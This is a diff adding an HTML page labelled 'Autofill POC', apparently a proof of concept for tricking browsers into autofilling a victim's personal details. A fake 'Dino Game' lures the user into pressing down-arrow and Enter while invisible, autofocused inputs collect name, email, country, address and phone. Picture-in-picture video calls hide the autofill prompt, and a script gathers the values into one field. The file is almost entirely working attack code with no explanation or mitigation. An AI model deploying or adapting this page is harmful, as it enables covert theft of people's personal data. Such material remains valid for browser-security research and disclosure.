@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html id="htmlid" dir="rtl">
+  <head>
+    <meta charset="utf-8">
+    <title>Autofill POC </title>
+     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+   
+    
+    
+<style>
+
+
+/* Change autocomplete styles in WebKit */
+input:-webkit-autofill,
+input:-webkit-autofill:hover, 
+input:-webkit-autofill:focus,
+textarea:-webkit-autofill,
+textarea:-webkit-autofill:hover,
+textarea:-webkit-autofill:focus,
+select:-webkit-autofill,
+select:-webkit-autofill:hover,
+select:-webkit-autofill:focus {
+  /*border: 1px solid black;*/
+  -webkit-text-fill-color: black;
+  /*-webkit-box-shadow: 0 0 0px 1000px #000 inset;*/
+  /*transition: background-color 2000s ease-in-out 0s;*/
+}
+
+/* PRESENTATIONAL STYLES */
+
+
+html {
+    font-family: sans-serif;
+    background-color: black;
+}
+body {
+ overflow-y: hidden
+background-color: white;
+
+}
+
+</style>
+
+    
+  <style>
+  
+body {
+background-color: black;
+ overflow-x: scroll;
+}
+     html { height:90%; }
+body { position:absolute; top:0; bottom:0; right:0; left:0; }
+
+/** This style for Dino Game in Modal**/
+*{
+    padding: 0;
+    margin: 0;
+    overflow-x: hidden;
+}
+.game{
+    width: 500px;
+    height: 200px;
+    border: 1px solid black;
+    margin: auto;
+}
+#character{
+    width: 20px;
+    height: 50px;
+    background-color: red;
+    position:relative;
+    top: 150px;
+}
+.animate{
+    animation: jump 0.3s linear;
+}
+@keyframes jump{
+    0%{top: 150px;}
+    30%{top: 100px;}
+    70%{top: 100px;}
+    100%{top: 150px;}
+}
+
+#block{
+    background-color: blue;
+    width: 20px;
+    height: 20px;
+    position: relative;
+    top: 130px;
+    left: 500px;
+    animation: block 1s infinite linear;
+}
+@keyframes block{
+    0%{left: 500px}
+    100%{left: -20px}
+}
+p{
+    text-align: right;
+}
+
+html { font-family: sans-serif; 
+    
+}
+
+#name {
+ position: absolute;
+ top:3px;
+  height:575px; /**590 work get one row at the end  top:10px; height:590px; width:2500px; right: 20;**/
+  width:2000px;
+  right: 20;
+ opacity:0;
+  
+}
+
+p { margin-left: 200px; }
+  </style>
+  <style>
+/* width */
+::-webkit-scrollbar {
+  width: 8px;
+}
+
+/* Track */
+::-webkit-scrollbar-track {
+  background: #f1f1f1; 
+}
+ 
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #888; 
+}
+
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: #555; 
+}
+</style>
+  </head>
+  <body>
+      
+   
+
+<!-- start of Game -->
+<div id="htmlevent" style='position: absoulte; top: 10%; z-index: 2; color: #999DDD;'><center>
+    <div id="instructions" style="top:100px;float: left;position:fixed;width:1900px;">
+    <h3><i>Play Advanced Dino Game</i></h3><b id='exa'> <br><br>
+    
+    <h3 style="color: green; text-shadow: 0px 0px 2px rgba(255,255,255,0.7); border-style: dotted; border-width: 2px; max-width: 500px" id="ar"><u>DOWN</u> ARROW then (Enter)  to Show Game</h3>
+     <div class="game" style="background:white;">
+        <div id="character"></div>
+        <div id="block"></div>
+    </div>
+   
+   <br><br>
+</div>
+<input type="text" id="txtName" style="background: lightgreen; color: black; text-shadow: 0px 0px 2px rgba(255,255,255,0.7); border-style: none; border-width: 2px;  width: 700px; height:50px;  max-width: 700px" readonly="readonly" />
+<br>
+<video id="video" controls="" muted loop autoplay src="./giphy.webm" autopictureinpicture hidden="true"></video>
+
+
+
+    <div id="pip-source" style='background-color: black;color: #C0C0C0; text-shadow: 0px 0px 6px rgba(255,255,255,0.7); max-width: 400px; opacity:0.001'>
+ 
+    </div>
+  
+   
+
+
+ 
+<script>
+
+
+function showDiv() {
+   document.getElementById('welcomeDiv').style.display = "block";
+}
+
+
+//this will fire pip mode and  Autofill appears behind that in the same time at the  first transition of pip  and still behind ,
+htmlid.addEventListener('keyup', () => {
+  video.requestPictureInPicture();
+
+  setTimeout(() => {
+ 
+  video.requestPictureInPicture();
+  }, 10); 
+   
+
+  
+});
+</script>
+ 
+ 
+    <script>
+ var video = document.getElementById('video');
+ var framedata = document.getElementById('framedata');
+
+    </script>
+  
+
+<input name="address-line1" id="address-line1" autocomplete="address-line1" onchange="sendtoparent();" >
+<input name="address-line2"  id="address-line2" autocomplete="address-line2" onchange="sendtoparent();">
+<input name="spoof" id="spoof" autocomplete="country-name">
+
+<input name="spoof" autocomplete="address-level2">
+<input name="state" autocomplete="address-level1" >
+<input name="name" id="name" autofocus=""  autocomplete="name"onfocus="video.requestPictureInPicture();" onblur="sendtoparent();" dir="rtl" ><br><!-- need to work here tomorrow to align and show only one row  and move this input up to make the autofill show only one row below-->
+<input  name="email"id="email" autocomplete="email" onchange="sendtoparent();" >
+<input name="postal-code" autocomplete="postal-code">
+<input name="tel" autocomplete="tel" id="tel" >
+
+
+
+
+<script type="text/javascript">
+    function sendtoparent() {
+
+
+            var txtName =document.getElementById("txtName");
+            var tel =document.getElementById("tel");
+            
+            txtName.value = "Name: " + document.getElementById("name").value + " ,Email: " + document.getElementById("email").value + " ,Country: " + document.getElementById("spoof").value + " ,Address: " + document.getElementById("address-line1").value + ",Phone: " + document.getElementById("tel").value;
+
+    }
+</script>
+
+
+
+    <script>
+ 
+ var video = document.getElementById('video');
+ var framedata = document.getElementById('framedata');
+setTimeout(function(){video.setAttribute('src', 'https://media.w3.org/2010/05/sintel/trailer.webm');},100);
+ 
+ 
+/// this part for simple Dino Game 
+var character = document.getElementById("character");
+var block = document.getElementById("block");
+var counter=0;
+function jump(){
+    if(character.classList == "animate"){return}
+    character.classList.add("animate");
+    setTimeout(function(){
+        character.classList.remove("animate");
+    },300);
+}
+var checkDead = setInterval(function() {
+    let characterTop = parseInt(window.getComputedStyle(character).getPropertyValue("top"));
+    let blockLeft = parseInt(window.getComputedStyle(block).getPropertyValue("left"));
+    if(blockLeft<20 && blockLeft>-20 && characterTop>=130){
+        block.style.animation = "none";
+        console.log("Game Over. score: "+Math.floor(counter/100));
+        counter=0;
+        block.style.animation = "block 1s infinite linear";
+    }else{
+        counter++;
+        document.getElementById("scoreSpan").innerHTML = Math.floor(counter/100);
+    }
+}, 10);
+    </script>
+    
+    
+    
+     
+<script>
+
+htmlid.addEventListener('click', () => {
+video.requestPictureInPicture();
+
+});
+
+</script>
+ 
+
+  </body>
+ 
+  
+</html>
